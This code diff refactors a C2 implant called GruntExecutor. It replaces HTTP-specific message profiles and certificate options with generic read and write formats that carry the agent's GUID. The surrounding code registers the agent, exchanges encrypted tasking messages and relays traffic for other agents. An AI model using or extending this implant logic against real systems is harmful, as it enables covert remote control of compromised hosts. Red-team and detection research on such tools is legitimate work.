@@ -25,11 +25,8 @@ namespace GruntExecutor
                 int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                 DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
 				
-				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
-				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
-                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
-                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
+				string ProfileReadFormat = @"{{REPLACE_PROFILE_READ_FORMAT}}".Replace(Environment.NewLine, "\n");
+				string ProfileWriteFormat = @"{{REPLACE_PROFILE_WRITE_FORMAT}}".Replace(Environment.NewLine, "\n");
 
                 string Hostname = Dns.GetHostName();
                 string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
@@ -67,7 +64,7 @@ namespace GruntExecutor
                 (
                     new MessageCrafter(GUID, SessionKey),
                     baseMessenger,
-                    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
+                    new Profile(ProfileReadFormat, ProfileWriteFormat, GUID)
                 );
                 messenger.WriteTaskingMessage(RegisterBody);
                 messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
@@ -255,27 +252,25 @@ namespace GruntExecutor
 
     public class Profile
     {
-        private string GetResponse { get; }
-        private string PostRequest { get; }
-        private string PostResponse { get; }
+        private string ReadFormat { get; }
+        private string WriteFormat { get; }
+		private string Guid { get; set; }
 
-        public Profile(string GetResponse, string PostRequest, string PostResponse)
+		public Profile(string ReadFormat, string WriteFormat, string Guid)
         {
-            this.GetResponse = GetResponse;
-            this.PostRequest = PostRequest;
-            this.PostResponse = PostResponse;
+            this.ReadFormat = ReadFormat;
+            this.WriteFormat = WriteFormat;
+			this.Guid = Guid;
         }
 
-        public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
-        public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
-        public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
-        public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }
-        public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }
-        public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }
+        public GruntEncryptedMessage ParseReadFormat(string Message) { return Parse(this.ReadFormat, Message); }
+        public GruntEncryptedMessage ParseWriteFormat(string Message) { return Parse(this.WriteFormat, Message); }
+        public string FormatReadFormat(GruntEncryptedMessage Message) { return Format(this.ReadFormat, this.Guid, Message); }
+        public string FormatWriteFormat(GruntEncryptedMessage Message) { return Format(this.WriteFormat, this.Guid, Message); }
 
         private static GruntEncryptedMessage Parse(string Format, string Message)
         {
-            string json = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(
+            string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(
                 Utilities.Parse(Message, Format)[0]
             ));
             if (json == null || json.Length < 3)
@@ -285,10 +280,10 @@ namespace GruntExecutor
             return GruntEncryptedMessage.FromJson(json);
         }
 
-        private static string Format(string Format, GruntEncryptedMessage Message)
+        private static string Format(string Format, string guid, GruntEncryptedMessage Message)
         {
             return String.Format(Format,
-                Utilities.HttpMessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
+                Utilities.MessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message))), guid
             );
         }
     }
@@ -326,7 +321,7 @@ namespace GruntExecutor
             {
                 return null;
             }
-            GruntEncryptedMessage gruntMessage = this.Profile.ParsePostResponse(read);
+            GruntEncryptedMessage gruntMessage = this.Profile.ParseReadFormat(read);
             if (gruntMessage == null)
             {
                 return null;
@@ -344,7 +339,7 @@ namespace GruntExecutor
                 if (relay != null)
                 {
                     // TODO: why does this need to be PostResponse?
-                    relay.Write(this.Profile.FormatPostResponse(wrappedMessage));
+                    relay.Write(this.Profile.FormatWriteFormat(wrappedMessage));
                 }
                 return null;
             }
@@ -353,7 +348,7 @@ namespace GruntExecutor
         public void WriteTaskingMessage(string Message, string Meta = "")
         {
             GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
-            string uploaded = this.Profile.FormatPostRequest(gruntMessage);
+            string uploaded = this.Profile.FormatWriteFormat(gruntMessage);
             lock (this._UpstreamLock)
             {
                 this.UpstreamMessenger.Write(uploaded);
@@ -387,7 +382,7 @@ namespace GruntExecutor
                         string read = downstream.Read();
                         if (downstream.Identifier == "")
                         {
-                            GruntEncryptedMessage message = this.Profile.ParsePostRequest(read);
+                            GruntEncryptedMessage message = this.Profile.ParseWriteFormat(read);
                             if (message.GUID.Length == 20)
                             {
                                  downstream.Identifier = message.GUID.Substring(10);
